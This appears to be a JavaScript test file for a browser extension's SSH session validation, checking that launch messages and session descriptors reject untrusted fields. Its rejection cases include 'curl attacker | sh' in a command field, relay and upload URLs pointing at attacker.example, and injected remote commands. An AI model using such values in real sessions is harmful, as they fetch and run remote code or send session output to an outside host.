import assert from 'node:assert/strict';
import {isAllowedExternalOrigin} from '../extension/js/background.js';
import {
  buildDescriptorFetchRequest,
  sanitizeUsernameHint,
  validateLaunchMessage,
  validateSessionDescriptor,
} from '../extension/js/slaif_session_descriptor.js';

const pending = {
  type: 'slaif.startSession',
  version: 1,
  hpc: 'test-sshd',
  sessionId: 'sess_descriptor123',
  launchToken: 'launch-token-123456',
};

const policyHost = {
  hostKeyAlias: 'test-sshd',
  sshHost: '127.0.0.1',
  sshPort: 22,
};
const signedPolicy = {
  type: 'slaif.hpcPolicy',
  version: 1,
  policyId: 'slaif-hpc-policy-test',
  sequence: 1,
  validFrom: '2026-04-30T00:00:00.000Z',
  validUntil: '2027-12-31T23:59:59.000Z',
  allowedApiOrigins: ['https://connect.slaif.si'],
  allowedRelayOrigins: ['wss://connect.slaif.si'],
  hosts: {'test-sshd': policyHost},
};

function descriptor(overrides = {}) {
  return {
    type: 'slaif.sessionDescriptor',
    version: 1,
    sessionId: pending.sessionId,
    hpc: pending.hpc,
    relayUrl: 'wss://connect.slaif.si/ssh-relay',
    relayToken: 'relay-token-123456',
    relayTokenExpiresAt: new Date(Date.now() + 60000).toISOString(),
    jobReportToken: 'job-report-token-123456',
    jobReportTokenExpiresAt: new Date(Date.now() + 60000).toISOString(),
    usernameHint: 'testuser',
    mode: 'launch',
    ...overrides,
  };
}

assert.deepEqual(validateLaunchMessage(pending), pending);
assert.throws(() => validateLaunchMessage({...pending, launchToken: undefined}), /launchToken/);
assert.throws(() => validateLaunchMessage({...pending, hpc: 'bad host'}), /invalid HPC alias/);
assert.throws(() => validateLaunchMessage({...pending, sessionId: 'sess_bad value'}), /invalid SLAIF session id/);
assert.throws(() => validateLaunchMessage({...pending, sshHost: 'attacker.example'}), /sshHost/);
assert.throws(() => validateLaunchMessage({...pending, sshPort: 22}), /sshPort/);
assert.throws(() => validateLaunchMessage({...pending, command: 'curl attacker | sh'}), /command/);

assert.equal(
    validateSessionDescriptor(descriptor(), pending, policyHost).relayUrl,
    'wss://connect.slaif.si/ssh-relay',
);
assert.equal(
    validateSessionDescriptor(descriptor(), pending, policyHost, {policy: signedPolicy}).relayUrl,
    'wss://connect.slaif.si/ssh-relay',
);
assert.throws(() => validateSessionDescriptor(
    descriptor({relayUrl: 'wss://attacker.example/ssh-relay'}), pending, policyHost, {policy: signedPolicy}), /not allowed/);
assert.throws(() => validateSessionDescriptor(
    descriptor({hpc: 'vegahpc'}), pending, policyHost), /hpc mismatch/);
assert.throws(() => validateSessionDescriptor(
    descriptor({sessionId: 'sess_other123'}), pending, policyHost), /sessionId mismatch/);
assert.throws(() => validateSessionDescriptor(
    descriptor({sshHost: 'attacker.example'}), pending, policyHost), /sshHost/);
assert.throws(() => validateSessionDescriptor(
    descriptor({knownHosts: ['test-sshd ssh-ed25519 AAAA']}), pending, policyHost), /knownHosts/);
assert.throws(() => validateSessionDescriptor(
    descriptor({remoteCommand: 'evil'}), pending, policyHost), /remoteCommand/);
assert.throws(() => validateSessionDescriptor(
    descriptor({jobCommand: 'evil'}), pending, policyHost), /jobCommand/);
assert.throws(() => validateSessionDescriptor(
    descriptor({stdoutUploadUrl: 'https://attacker.example/upload'}), pending, policyHost), /stdoutUploadUrl/);
assert.throws(() => validateSessionDescriptor(
    descriptor({relayUrl: 'http://127.0.0.1:1234/ssh-relay'}), pending, policyHost), /relayUrl/);
assert.throws(() => validateSessionDescriptor(
    descriptor({relayUrl: 'ws://example.com:1234/ssh-relay'}), pending, policyHost, {allowLocalDev: true}), /relayUrl/);
assert.equal(
    validateSessionDescriptor(
        descriptor({relayUrl: 'ws://127.0.0.1:1234/ssh-relay'}),
        pending,
        policyHost,
        {allowLocalDev: true},
    ).relayUrl,
    'ws://127.0.0.1:1234/ssh-relay',
);
assert.throws(() => validateSessionDescriptor(
    descriptor({relayTokenExpiresAt: new Date(Date.now() - 1000).toISOString()}),
    pending,
    policyHost,
), /expired/);
assert.throws(() => validateSessionDescriptor(
    descriptor({jobReportToken: undefined}),
    pending,
    policyHost,
), /jobReportToken/);
assert.throws(() => validateSessionDescriptor(
    descriptor({jobReportTokenExpiresAt: new Date(Date.now() - 1000).toISOString()}),
    pending,
    policyHost,
), /jobReportToken has expired/);

assert.equal(sanitizeUsernameHint('test.user-1'), 'test.user-1');
assert.equal(sanitizeUsernameHint(undefined), undefined);
assert.throws(() => sanitizeUsernameHint('bad user'), /usernameHint/);

const request = buildDescriptorFetchRequest(pending, 'https://connect.slaif.si/');
assert.equal(request.url, 'https://connect.slaif.si/api/connect/session/sess_descriptor123');
assert.equal(request.options.headers.Authorization, `Bearer ${pending.launchToken}`);
assert(!request.url.includes(pending.launchToken));
assert.throws(() => buildDescriptorFetchRequest(pending, 'http://example.com'), /https/);

assert.equal(isAllowedExternalOrigin('https://connect.slaif.si'), true);
assert.equal(isAllowedExternalOrigin('http://127.0.0.1:48123'), true);
assert.equal(isAllowedExternalOrigin('http://localhost:48123'), false);
assert.equal(isAllowedExternalOrigin('https://attacker.example'), false);

console.log('session descriptor tests OK');
